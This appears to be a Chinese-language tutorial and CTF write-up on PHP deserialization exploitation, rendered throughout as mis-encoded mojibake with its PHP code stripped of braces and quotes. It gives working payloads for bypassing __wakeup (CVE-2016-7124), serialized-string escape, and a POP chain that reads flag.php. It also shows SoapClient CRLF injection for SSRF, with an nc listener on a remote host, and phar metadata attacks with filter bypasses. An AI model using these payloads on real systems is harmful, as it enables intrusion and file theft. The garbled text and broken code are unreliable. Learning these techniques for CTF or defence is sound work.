urlencode(serialize($a));? è¾“å‡ºåˆ™ä¼šå¯¼è‡´ä¸å¯è§å­—ç¬¦\\x00çš„ä¸¢å¤± O:4:test:2:s:4: * a;s:9:xiaoshizi;s:7: test b;s:8:laoshizi; ååºåˆ—åŒ–ä¸­å¸¸è§çš„é­”æœ¯æ–¹æ³•__wakeup() //æ‰§è¡Œunserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°__sleep() //æ‰§è¡Œserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°__destruct() //å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘__call() //åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘__callStatic() //åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘__get() //ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®æˆ–è€…ä¸å­˜åœ¨è¿™ä¸ªé”®éƒ½ä¼šè°ƒç”¨æ­¤æ–¹æ³•__set() //ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§__isset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘__unset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘__toString() //æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘__invoke() //å½“å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘ ååºåˆ—åŒ–ç»•è¿‡å°Trickphp7.1+ååºåˆ—åŒ–å¯¹ç±»å±æ€§ä¸æ•æ„Ÿæˆ‘ä»¬å‰é¢è¯´äº†å¦‚æœå˜é‡å‰æ˜¯protectedï¼Œåºåˆ—åŒ–ç»“æœä¼šåœ¨å˜é‡åå‰åŠ ä¸Š\\x00*\\x00 ä½†åœ¨ç‰¹å®šç‰ˆæœ¬7.1ä»¥ä¸Šåˆ™å¯¹äºç±»å±æ€§ä¸æ•æ„Ÿï¼Œæ¯”å¦‚ä¸‹é¢çš„ä¾‹å­å³ä½¿æ²¡æœ‰\\x00*\\x00ä¹Ÿä¾ç„¶ä¼šè¾“å‡ºabc ?phpclass test protected $a; public function __construct() $this-a = abc; public function __destruct() echo $this-a; unserialize(O:4:test:1:s:1:a;s:3:abc;); ç»•è¿‡__wakeup(CVE-2016-7124) ç‰ˆæœ¬ï¼š PHP5 5.6.25 PHP7 7.0.10 åˆ©ç”¨æ–¹å¼ï¼šåºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œ å¯¹äºä¸‹é¢è¿™æ ·ä¸€ä¸ªè‡ªå®šä¹‰ç±» ?phpclass test public $a; public function __construct() $this-a = abc; public function __wakeup() $this-a=666; public function __destruct() echo $this-a; å¦‚æœæ‰§è¡Œunserialize(O:4:test:1:{s:1:a;s:3:abc;});è¾“å‡ºç»“æœä¸º666 è€ŒæŠŠå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¢å¤§æ‰§è¡Œunserialize(O:4:test:2:{s:1:a;s:3:abc;});è¾“å‡ºç»“æœä¸ºabc ç»•è¿‡éƒ¨åˆ†æ­£åˆ™preg_match(/^O:\\d+/)åŒ¹é…åºåˆ—åŒ–å­—ç¬¦ä¸²æ˜¯å¦æ˜¯å¯¹è±¡å­—ç¬¦ä¸²å¼€å¤´,è¿™åœ¨æ›¾ç»çš„CTFä¸­ä¹Ÿå‡ºè¿‡ç±»ä¼¼çš„è€ƒç‚¹ åˆ©ç”¨åŠ å·ç»•è¿‡ï¼ˆæ³¨æ„åœ¨urlé‡Œä¼ å‚æ—¶+è¦ç¼–ç ä¸º%2Bï¼‰ serialize(array($ a)); $aä¸ºè¦ååºåˆ—åŒ–çš„å¯¹è±¡(åºåˆ—åŒ–ç»“æœå¼€å¤´æ˜¯aï¼Œä¸å½±å“ä½œä¸ºæ•°ç»„å…ƒç´ çš„$açš„ææ„) ?phpclass test public $a; public function __construct() $this-a = abc; public function __destruct() echo $this-a.PHP_EOL; function match($data) if (preg_match(/^O:\\d+/,$data)) die(you lose!); else return $data; $a = O:4:test:1:s:1:a;s:3:abc;;// +å·ç»•è¿‡$b = str_replace(O:4,O:+4, $a);unserialize(match($b));// serialize(array($a));unserialize(a:1:i:0;O:4:test:1:s:1:a;s:3:abc;); åˆ©ç”¨å¼•ç”¨?phpclass test public $a; public $b; public function __construct() $this-a = abc; $this-b= $this-a; public function __destruct() if($this-a===$this-b) echo 666; $a = serialize(new test()); ä¸Šé¢è¿™ä¸ªä¾‹å­å°†$bè®¾ç½®ä¸º$açš„å¼•ç”¨ï¼Œå¯ä»¥ä½¿$aæ°¸è¿œä¸$bç›¸ç­‰ 16è¿›åˆ¶ç»•è¿‡å­—ç¬¦çš„è¿‡æ»¤O:4:test:2:s:4:%00*%00a;s:3:abc;s:7:%00test%00b;s:3:def;å¯ä»¥å†™æˆO:4:test:2:S:4:\\00*\\00\\61;s:3:abc;s:7:%00test%00b;s:3:def;è¡¨ç¤ºå­—ç¬¦ç±»å‹çš„så¤§å†™æ—¶ï¼Œä¼šè¢«å½“æˆ16è¿›åˆ¶è§£æã€‚ æˆ‘è¿™é‡Œå†™äº†ä¸€ä¸ªä¾‹å­ ?phpclass test public $username; public function __construct() $this-username = admin; public function __destruct() echo 666; function check($data) if(stristr($data, username)!==False) echo(ä½ ç»•ä¸è¿‡ï¼ï¼.PHP_EOL); else return $data; // æœªä½œå¤„ç†å‰$a = O:4:test:1:s:8:username;s:5:admin;;$a = check($a);unserialize($a);// åšå¤„ç†å \\75æ˜¯uçš„16è¿›åˆ¶$a = O:4:test:1:S:8:\\\\75sername;s:5:admin;;$a = check($a);unserialize($a); PHPååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸æƒ…å†µ1ï¼šè¿‡æ»¤åå­—ç¬¦å˜å¤šé¦–å…ˆç»™å‡ºæœ¬åœ°çš„phpä»£ç ï¼Œå¾ˆç®€å•ä¸åšè¿‡å¤šçš„è§£é‡Šï¼Œå°±æ˜¯æŠŠååºåˆ—åŒ–åçš„ä¸€ä¸ªxæ›¿æ¢æˆä¸ºä¸¤ä¸ª ?phpfunction change($str) return str_replace(x,xx,$str);$name = $_GET[name];$age = I am 11;$arr = array($name,$age);echo ååºåˆ—åŒ–å­—ç¬¦ä¸²ï¼š;var_dump(serialize($arr));echo br/;echo è¿‡æ»¤å:;$old = change(serialize($arr));$new = unserialize($old);var_dump($new);echo br/æ­¤æ—¶ï¼Œage=$new[1]; æ­£å¸¸æƒ…å†µ,ä¼ å…¥name=mao å¦‚æœæ­¤æ—¶å¤šä¼ å…¥ä¸€ä¸ªxçš„è¯ä¼šæ€æ ·ï¼Œæ¯«æ— ç–‘é—®ååºåˆ—åŒ–å¤±è´¥ï¼Œç”±äºæº¢å‡º(sæœ¬æ¥æ˜¯4ç»“æœå¤šäº†ä¸€ä¸ªå­—ç¬¦å‡ºæ¥)ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹å®ç°å­—ç¬¦ä¸²é€ƒé€¸ é¦–å…ˆæ¥çœ‹çœ‹ç»“æœï¼Œå†æ¥è®²è§£ æˆ‘ä»¬ä¼ å…¥name=maoxxxxxxxxxxxxxxxxxxxx;i:1;s:6:woaini;};i:1;s:6:woaini;}è¿™ä¸€éƒ¨åˆ†ä¸€å…±äºŒåä¸ªå­—ç¬¦ç”±äºä¸€ä¸ªxä¼šè¢«æ›¿æ¢ä¸ºä¸¤ä¸ªï¼Œæˆ‘ä»¬è¾“å…¥äº†ä¸€å…±20ä¸ªxï¼Œç°åœ¨æ˜¯40ä¸ªï¼Œå¤šå‡ºæ¥çš„20ä¸ªxå…¶å®å–ä»£äº†æˆ‘ä»¬çš„è¿™äºŒåä¸ªå­—ç¬¦;i:1;s:6:woaini;}ï¼Œä»è€Œé€ æˆ;i:1;s:6:woaini;}çš„æº¢å‡ºï¼Œè€Œé—­åˆäº†å‰ä¸²ï¼Œä½¿å¾—æˆ‘ä»¬çš„å­—ç¬¦ä¸²æˆåŠŸé€ƒé€¸ï¼Œå¯ä»¥è¢«ååºåˆ—åŒ–ï¼Œè¾“å‡ºwoainiæœ€åçš„;}é—­åˆååºåˆ—åŒ–å…¨è¿‡ç¨‹å¯¼è‡´åŸæ¥çš„;i:1;s:7:I am 11;}è¢«èˆå¼ƒï¼Œä¸å½±å“ååºåˆ—åŒ–è¿‡ç¨‹ æƒ…å†µ2ï¼šè¿‡æ»¤åå­—ç¬¦å˜å°‘è€è§„çŸ©å…ˆä¸Šä»£ç ,å¾ˆç®€å•ä¸åšè¿‡å¤šçš„è§£é‡Šï¼Œå°±æ˜¯æŠŠååºåˆ—åŒ–åçš„ä¸¤ä¸ªxæ›¿æ¢æˆä¸ºä¸€ä¸ª ?phpfunction change($str) return str_replace(xx,x,$str);$arr[name] = $_GET[name];$arr[age] = $_GET[age];echo ååºåˆ—åŒ–å­—ç¬¦ä¸²ï¼š;var_dump(serialize($arr));echo br/;echo è¿‡æ»¤å:;$old = change(serialize($arr));var_dump($old);echo br/;$new = unserialize($old);var_dump($new);echo br/æ­¤æ—¶ï¼Œage=;echo $new[age]; æ­£å¸¸æƒ…å†µä¼ å…¥name=maoage=11çš„ç»“æœ è€è§„çŸ©çœ‹çœ‹æœ€åæ„é€ çš„ç»“æœï¼Œå†ç»§ç»­è®²è§£ ç®€å•æ¥è¯´ï¼Œå°±æ˜¯å‰é¢å°‘äº†ä¸€åŠï¼Œå¯¼è‡´åé¢çš„å­—ç¬¦è¢«åƒæ‰ï¼Œä»è€Œæ‰§è¡Œäº†æˆ‘ä»¬åé¢çš„ä»£ç ï¼›æˆ‘ä»¬æ¥çœ‹ï¼Œè¿™éƒ¨åˆ†æ˜¯ageåºåˆ—åŒ–åçš„ç»“æœ s:3:age;s:28:11;s:3:age;s:6:woaini;} ç”±äºå‰é¢æ˜¯40ä¸ªxæ‰€ä»¥å¯¼è‡´å°‘äº†20ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥éœ€è¦åé¢æ¥è¡¥ä¸Šï¼Œ;s:3:age;s:28:11è¿™ä¸€éƒ¨åˆ†åˆšå¥½20ä¸ªï¼Œåé¢ç”±äºæœ‰é—­åˆäº†å‰é¢å› æ­¤åé¢çš„å‚æ•°å°±å¯ä»¥ç”±æˆ‘ä»¬è‡ªå®šä¹‰æ‰§è¡Œäº† å¯¹è±¡æ³¨å…¥å½“ç”¨æˆ·çš„è¯·æ±‚åœ¨ä¼ ç»™ååºåˆ—åŒ–å‡½æ•°unserialize()ä¹‹å‰æ²¡æœ‰è¢«æ­£ç¡®çš„è¿‡æ»¤æ—¶å°±ä¼šäº§ç”Ÿæ¼æ´ã€‚å› ä¸ºPHPå…è®¸å¯¹è±¡åºåˆ—åŒ–ï¼Œæ”»å‡»è€…å°±å¯ä»¥æäº¤ç‰¹å®šçš„åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ç»™ä¸€ä¸ªå…·æœ‰è¯¥æ¼æ´çš„unserializeå‡½æ•°ï¼Œæœ€ç»ˆå¯¼è‡´ä¸€ä¸ªåœ¨è¯¥åº”ç”¨èŒƒå›´å†…çš„ä»»æ„PHPå¯¹è±¡æ³¨å…¥ã€‚ å¯¹è±¡æ¼æ´å‡ºç°å¾—æ»¡è¶³ä¸¤ä¸ªå‰æ 1ã€unserializeçš„å‚æ•°å¯æ§ã€‚2ã€ ä»£ç é‡Œæœ‰å®šä¹‰ä¸€ä¸ªå«æœ‰é­”æœ¯æ–¹æ³•çš„ç±»ï¼Œå¹¶ä¸”è¯¥æ–¹æ³•é‡Œå‡ºç°ä¸€äº›ä½¿ç”¨ç±»æˆå‘˜å˜é‡ä½œä¸ºå‚æ•°çš„å­˜åœ¨å®‰å…¨é—®é¢˜çš„å‡½æ•°ã€‚ æ¯”å¦‚è¿™ä¸ªä¾‹å­ ?phpclass A var $test = y4mao; function __destruct() echo $this-test; $a = O:1:A:1:s:4:test;s:5:maomi;;unserialize($a); åœ¨è„šæœ¬è¿è¡Œç»“æŸåä¾¿ä¼šè°ƒç”¨_destructå‡½æ•°ï¼ŒåŒæ—¶ä¼šè¦†ç›–testå˜é‡è¾“å‡ºmaomi POPé“¾çš„æ„é€ åˆ©ç”¨POPé“¾ç®€å•ä»‹ç»å‰é¢æ‰€è®²è§£çš„åºåˆ—åŒ–æ”»å‡»æ›´å¤šçš„æ˜¯é­”æœ¯æ–¹æ³•ä¸­å‡ºç°ä¸€äº›åˆ©ç”¨çš„æ¼æ´ï¼Œå› ä¸ºè‡ªåŠ¨è°ƒç”¨è€Œè§¦å‘æ¼æ´ï¼Œä½†å¦‚æœå…³é”®ä»£ç ä¸åœ¨é­”æœ¯æ–¹æ³•ä¸­ï¼Œè€Œæ˜¯åœ¨ä¸€ä¸ªç±»çš„æ™®é€šæ–¹æ³•ä¸­ã€‚è¿™æ—¶å€™å¯ä»¥é€šè¿‡å¯»æ‰¾ç›¸åŒçš„å‡½æ•°åå°†ç±»çš„å±æ€§å’Œæ•æ„Ÿå‡½æ•°çš„å±æ€§è”ç³»èµ·æ¥ ç®€å•æ¡ˆä¾‹è®²è§£é¦–å…ˆçœ‹çœ‹ç®€å•çš„MRCTF2020-Ezpop,ä¸å¸¦å¤§å®¶ä¸€ä¸€è¯»ä»£ç äº†ï¼Œè‡ªå·±è§£å†³ ?phpclass Modifier protected $var; public function append($value) include($value); public function __invoke() $this-append($this-var); class Show public $source; public $str; public function __construct($file=index.php) $this-source = $file; echo Welcome to .$this-source.br; public function __toString() return $this-str-source; public function __wakeup() if(preg_match(/gopher|http|file|ftp|https|dict|\\.\\./i, $this-source)) echo hacker; $this-source = index.php; class Test public $p; public function __construct() $this-p = array(); public function __get($key) $function = $this-p; return $function(); è¿™é‡Œæˆ‘ç›´æ¥è¯´åˆ©ç”¨æ€è·¯ï¼Œé¦–å…ˆé€†å‘åˆ†æï¼Œæˆ‘ä»¬æœ€ç»ˆæ˜¯å¸Œæœ›é€šè¿‡Modifierå½“ä¸­çš„appendæ–¹æ³•å®ç°æœ¬åœ°æ–‡ä»¶åŒ…å«è¯»å–æ–‡ä»¶ï¼Œå›æº¯åˆ°è°ƒç”¨å®ƒçš„__invokeï¼Œå½“æˆ‘ä»¬å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘,å‘ç°åœ¨Testç±»å½“ä¸­çš„__getæ–¹æ³•ï¼Œå†å›æº¯åˆ°Showå½“ä¸­çš„__toStringï¼Œå†å›æº¯åˆ°Showå½“ä¸­çš„__constructå½“ä¸­æœ‰echo $this-sourceå¯ä»¥è°ƒç”¨__toString å› æ­¤ä¸éš¾æ„é€ popé“¾ ?phpini_set(memory_limit,-1);class Modifier protected $var = php://filter/read=convert.base64-encode/resource=flag.php;class Show public $source; public $str; public function __construct($file) $this-source = $file; $this-str = new Test(); class Test public $p; public function __construct() $this-p = new Modifier(); $a = new Show(aaa);$a = new Show($a);echo urlencode(serialize($a)); PHPåŸç”Ÿç±»ååºåˆ—åŒ–åˆ©ç”¨SoapClientä»‹ç» ç»¼è¿°ï¼š phpåœ¨å®‰è£…php-soapæ‹“å±•åï¼Œå¯ä»¥ååºåˆ—åŒ–åŸç”Ÿç±»SoapClientï¼Œæ¥å‘é€http postè¯·æ±‚ã€‚ å¿…é¡»è°ƒç”¨SoapClientä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œè§¦å‘SoapClientçš„__callé­”æœ¯æ–¹æ³•ã€‚ é€šè¿‡CRLFæ¥æ·»åŠ è¯·æ±‚ä½“ï¼šSoapClientå¯ä»¥æŒ‡å®šè¯·æ±‚çš„user-agentå¤´ï¼Œé€šè¿‡æ·»åŠ æ¢è¡Œç¬¦çš„å½¢å¼æ¥åŠ å…¥å…¶ä»–è¯·æ±‚å†…å®¹ SoapClienté‡‡ç”¨äº†HTTPä½œä¸ºåº•å±‚é€šè®¯åè®®ï¼ŒXMLä½œä¸ºæ•°æ®ä¼ é€çš„æ ¼å¼ï¼Œå…¶é‡‡ç”¨äº†SOAPåè®®(SOAP æ˜¯ä¸€ç§ç®€å•çš„åŸºäº XML çš„åè®®,å®ƒä½¿åº”ç”¨ç¨‹åºé€šè¿‡ HTTP æ¥äº¤æ¢ä¿¡æ¯)ï¼Œå…¶æ¬¡æˆ‘ä»¬çŸ¥é“æŸä¸ªå®ä¾‹åŒ–çš„ç±»ï¼Œå¦‚æœå»è°ƒç”¨äº†ä¸€ä¸ªä¸å­˜åœ¨çš„å‡½æ•°ï¼Œä¼šå»è°ƒç”¨__callæ–¹æ³•ï¼Œå…·ä½“è¯¦ç»†çš„ä¿¡æ¯å¤§å®¶å¯ä»¥å»æœç´¢å¼•æ“çœ‹çœ‹ï¼Œè¿™é‡Œä¸å†èµ˜è¿° åˆ©ç”¨æ–¹å¼ä¸‹é¢é¦–å…ˆåœ¨æˆ‘çš„VPSä¸Šé¢å¼€å¯ç›‘å¬nc -lvvp 9328 ?php$a = new SoapClient(null,array(uri=bbb, location=http://xxxx.xxx.xx:9328));$b = serialize($a);$c = unserialize($b);$c - not_a_function();//è°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œè®©SoapClientè°ƒç”¨__call è¿è¡Œä¸Šé¢çš„phpç¨‹åºï¼Œåœ¨æˆ‘çš„vpsä¸Šé¢å¥–ä¼šæ•è·ç›‘å¬ ä»ä¸Šé¢è¿™å¼ å›¾å¯ä»¥çœ‹åˆ°ï¼ŒSOAPActionå¤„æ˜¯æˆ‘ä»¬çš„å¯æ§å‚æ•°ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å°è¯•æ³¨å…¥æˆ‘ä»¬è‡ªå·±æ¶æ„æ„é€ çš„CRLFå³æ’å…¥**\\r **ï¼Œåˆ©ç”¨æˆåŠŸï¼ ä½†æ˜¯è¿˜æœ‰ä¸ªé—®é¢˜æˆ‘ä»¬å†å‘é€POSTæ•°æ®çš„æ—¶å€™æ˜¯éœ€è¦éµå¾ªHTTPåè®®ï¼ŒæŒ‡å®šè¯·æ±‚å¤´Content-Type: applicationx-www-form-urlencodedä½†Content-Typeåœ¨SOAPActionçš„ä¸Šé¢ï¼Œå°±æ— æ³•æ§åˆ¶Content-Type,ä¹Ÿå°±ä¸èƒ½æ§åˆ¶POSTçš„æ•°æ® æ¥ä¸‹æ¥æˆ‘ä»¬å®éªŒä¸€ä¸‹ å®æˆ˜ååºåˆ—åŒ–æˆ‘ä»¬ä¼ å…¥çš„vipæ‰§è¡ŒgetFlagå‡½æ•°(è¿·æƒ‘äººçš„å‡½æ•°) ?phphighlight_file(__FILE__);$vip = unserialize($_GET[vip]);$vip-getFlag();//flag.php$xff = explode(,, $_SERVER[HTTP_X_FORWARDED_FOR]);array_pop($xff);$ip = array_pop($xff);â€‹â€‹if($ip!==127.0.0.1) die(error);else $token = $_POST[token]; if($token==ctfshow) file_put_contents(flag.txt,$flag); ç”±äºæœåŠ¡å™¨å¸¦æœ‰cloudfareä»£ç†ï¼Œæˆ‘ä»¬æ— æ³•é€šè¿‡æœ¬åœ°æ„é€ XFFå¤´å®ç°ç»•è¿‡ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨SoapClientä¸CRLFå®ç°SSRFè®¿é—®127.0.0.1/flag.php,å³å¯ç»•è¿‡cloudfareä»£ç† ?php$target = http://127.0.0.1/flag.php;$post_string = token=ctfshow;$headers = array( X-Forwarded-For: 127.0.0.1,127.0.0.1, UM_distinctid:175648cc09a7ae-050bc162c95347-32667006-13c680-175648cc09b69d);$b = new SoapClient(null,array(location = $target,user_agent=y4tacker^^Content-Type: application/x-www-form-urlencoded^^.join(^^,$headers).^^Content-Length: .(string)strlen($post_string).^^^^.$post_string,uri = aaab));$aaa = serialize($b);$aaa = str_replace(^^,\\r ,$aaa);$aaa = str_replace(,,$aaa);echo urlencode($aaa); æ¥ä¸‹æ¥è®¿é—®flag.txtå³å¯ Pharååºåˆ—åŒ–pharæ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-dataã€‚å½“å—å½±å“çš„æ–‡ä»¶æ“ä½œå‡½æ•°è°ƒç”¨pharæ–‡ä»¶æ—¶ï¼Œä¼šè‡ªåŠ¨ååºåˆ—åŒ–meta-dataå†…çš„å†…å®¹ã€‚ ä»€ä¹ˆæ˜¯pharæ–‡ä»¶åœ¨è½¯ä»¶ä¸­ï¼ŒPHARï¼ˆPHPå½’æ¡£ï¼‰æ–‡ä»¶æ˜¯ä¸€ç§æ‰“åŒ…æ ¼å¼ï¼Œé€šè¿‡å°†è®¸å¤šPHPä»£ç æ–‡ä»¶å’Œå…¶ä»–èµ„æºï¼ˆä¾‹å¦‚å›¾åƒï¼Œæ ·å¼è¡¨ç­‰ï¼‰æ†ç»‘åˆ°ä¸€ä¸ªå½’æ¡£æ–‡ä»¶ä¸­æ¥å®ç°åº”ç”¨ç¨‹åºå’Œåº“çš„åˆ†å‘ phpé€šè¿‡ç”¨æˆ·å®šä¹‰å’Œå†…ç½®çš„â€œæµåŒ…è£…å™¨â€å®ç°å¤æ‚çš„æ–‡ä»¶å¤„ç†åŠŸèƒ½ã€‚å†…ç½®åŒ…è£…å™¨å¯ç”¨äºæ–‡ä»¶ç³»ç»Ÿå‡½æ•°ï¼Œå¦‚(fopen(),copy(),file_exists()å’Œfilesize()ã€‚ phar:å°±æ˜¯ä¸€ç§å†…ç½®çš„æµåŒ…è£…å™¨ã€‚ phpä¸­ä¸€äº›å¸¸è§çš„æµåŒ…è£…å™¨å¦‚ä¸‹ï¼š file:// â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œåœ¨ç”¨æ–‡ä»¶ç³»ç»Ÿå‡½æ•°æ—¶é»˜è®¤å°±ä½¿ç”¨è¯¥åŒ…è£…å™¨http:// â€” è®¿é—® HTTP(s) ç½‘å€ftp:// â€” è®¿é—® FTP(s) URLsphp:// â€” è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰zlib:// â€” å‹ç¼©æµdata:// â€” æ•°æ®ï¼ˆRFC 2397ï¼‰glob:// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼phar:// â€” PHP å½’æ¡£ssh2:// â€” Secure Shell 2rar:// â€” RARogg:// â€” éŸ³é¢‘æµexpect:// â€” å¤„ç†äº¤äº’å¼çš„æµ pharæ–‡ä»¶çš„ç»“æ„stub:pharæ–‡ä»¶çš„æ ‡å¿—ï¼Œå¿…é¡»ä»¥ xxx __HALT_COMPILER();? ç»“å°¾ï¼Œå¦åˆ™æ— æ³•è¯†åˆ«ã€‚xxxå¯ä»¥ä¸ºè‡ªå®šä¹‰å†…å®¹ã€‚manifest:pharæ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œå…¶ä¸­æ¯ä¸ªè¢«å‹ç¼©æ–‡ä»¶çš„æƒé™ã€å±æ€§ç­‰ä¿¡æ¯éƒ½æ”¾åœ¨è¿™éƒ¨åˆ†ã€‚è¿™éƒ¨åˆ†è¿˜ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-dataï¼Œè¿™æ˜¯æ¼æ´åˆ©ç”¨æœ€æ ¸å¿ƒçš„åœ°æ–¹ã€‚content:è¢«å‹ç¼©æ–‡ä»¶çš„å†…å®¹signature (å¯ç©º):ç­¾åï¼Œæ”¾åœ¨æœ«å°¾ã€‚ å¦‚ä½•ç”Ÿæˆä¸€ä¸ªpharæ–‡ä»¶ï¼Ÿä¸‹é¢ç»™å‡ºä¸€ä¸ªå‚è€ƒä¾‹å­ ?php class Test @unlink(phar.phar); $phar = new Phar(phar.phar); //åç¼€åå¿…é¡»ä¸ºphar $phar-startBuffering(); $phar-setStub(?php __HALT_COMPILER(); ?); //è®¾ç½®stub $o = new Test(); $phar-setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest $phar-addFromString(test.txt, test); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ //ç­¾åè‡ªåŠ¨è®¡ç®— $phar-stopBuffering();? æ¼æ´åˆ©ç”¨æ¡ä»¶ pharæ–‡ä»¶è¦èƒ½å¤Ÿä¸Šä¼ åˆ°æœåŠ¡å™¨ç«¯ã€‚ è¦æœ‰å¯ç”¨çš„é­”æœ¯æ–¹æ³•ä½œä¸ºâ€œè·³æ¿â€ã€‚ æ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°å¯æ§ï¼Œä¸”:ã€/ã€pharç­‰ç‰¹æ®Šå­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤ã€‚ å—å½±å“çš„å‡½æ•°çŸ¥é“åˆ›å®‡æµ‹è¯•åå—å½±å“çš„å‡½æ•°åˆ—è¡¨ï¼š å®é™…ä¸Šä¸æ­¢è¿™äº›ï¼Œä¹Ÿå¯ä»¥å‚è€ƒè¿™ç¯‡é“¾æ¥ï¼Œé‡Œé¢æœ‰è¯¦ç»†è¯´æ˜https://blog.zsxsoft.com/post/38 å½“ç„¶ä¸ºäº†é˜…è¯»æ–¹ä¾¿ï¼Œè¿™é‡Œä¾¿æŠŠå®ƒæ•´ç†è¿‡æ¥ //exifexif_thumbnailexif_imagetype //gdimageloadfontimagecreatefrom***ç³»åˆ—å‡½æ•° //hash hash_hmac_filehash_filehash_update_filemd5_filesha1_file // file/urlget_meta_tagsget_headers //standard getimagesizegetimagesizefromstring // zip $zip = new ZipArchive();$res = $zip-open(c.zip);$zip-extractTo(phar://test.phar/test);// Bzip / Gzip å½“ç¯å¢ƒé™åˆ¶äº†pharä¸èƒ½å‡ºç°åœ¨å‰é¢çš„å­—ç¬¦é‡Œã€‚å¯ä»¥ä½¿ç”¨compress.bzip2://å’Œcompress.zlib://ç»•è¿‡$z = compress.bzip2://phar:///home/sx/test.phar/test.txt;$z = compress.zlib://phar:///home/sx/test.phar/test.txt;//é…åˆå…¶ä»–åè®®ï¼š(SUCTF)//https://www.xctf.org.cn/library/details/17e9b70557d94b168c3e5d1e7d4ce78f475de26d///å½“ç¯å¢ƒé™åˆ¶äº†pharä¸èƒ½å‡ºç°åœ¨å‰é¢çš„å­—ç¬¦é‡Œï¼Œè¿˜å¯ä»¥é…åˆå…¶ä»–åè®®è¿›è¡Œåˆ©ç”¨ã€‚//php://filter/read=convert.base64-encode/resource=phar://phar.phar//Postgres pgsqlCopyToFileå’Œpg_traceåŒæ ·ä¹Ÿæ˜¯èƒ½ä½¿ç”¨çš„ï¼Œéœ€è¦å¼€å¯pharçš„å†™åŠŸèƒ½ã€‚?php $pdo = new PDO(sprintf(pgsql:host=%s;dbname=%s;user=%s;password=%s, 127.0.0.1, postgres, sx, 123456)); @$pdo-pgsqlCopyFromFile(aa, phar://phar.phar/aa);? // Mysql//LOAD DATA LOCAL INFILEä¹Ÿä¼šè§¦å‘è¿™ä¸ªphp_stream_open_wrapper//é…ç½®ä¸€ä¸‹mysqld://[mysqld]//local-infile=1//secure_file_priv= ?phpclass A public $s = ; public function __wakeup () system($this-s); $m = mysqli_init();mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);$s = mysqli_real_connect($m, localhost, root, root, testtable, 3306);$p = mysqli_query($m, LOAD DATA LOCAL INFILE \\phar://test.phar/test\\ INTO TABLE a LINES TERMINATED BY \\\\r \\ IGNORE 1 LINES;);? ç»•è¿‡æ–¹å¼å½“ç¯å¢ƒé™åˆ¶äº†pharä¸èƒ½å‡ºç°åœ¨å‰é¢çš„å­—ç¬¦é‡Œã€‚å¯ä»¥ä½¿ç”¨compress.bzip2://å’Œcompress.zlib://ç­‰ç»•è¿‡ compress.bzip://phar:///test.phar/test.txtcompress.bzip2://phar:///test.phar/test.txtcompress.zlib://phar:///home/sx/test.phar/test.txtphp://filter/resource=phar:///test.phar/test.txt å½“ç¯å¢ƒé™åˆ¶äº†pharä¸èƒ½å‡ºç°åœ¨å‰é¢çš„å­—ç¬¦é‡Œï¼Œè¿˜å¯ä»¥é…åˆå…¶ä»–åè®®è¿›è¡Œåˆ©ç”¨ã€‚php:filterreadconvert.base64-encoderesourcephar:phar.phar GIFæ ¼å¼éªŒè¯å¯ä»¥é€šè¿‡åœ¨æ–‡ä»¶å¤´éƒ¨æ·»åŠ GIF89aç»•è¿‡1ã€$phar-setStub(â€œGIF89aâ€.â€â€); è®¾ç½®stub2ã€ç”Ÿæˆä¸€ä¸ªphar.pharï¼Œä¿®æ”¹åç¼€åä¸ºphar.gif php-sessionååºåˆ—åŒ–sessionç®€å•ä»‹ç»åœ¨è®¡ç®—æœºä¸­ï¼Œå°¤å…¶æ˜¯åœ¨ç½‘ç»œåº”ç”¨ä¸­ï¼Œç§°ä¸ºâ€œä¼šè¯æ§åˆ¶â€ã€‚Session 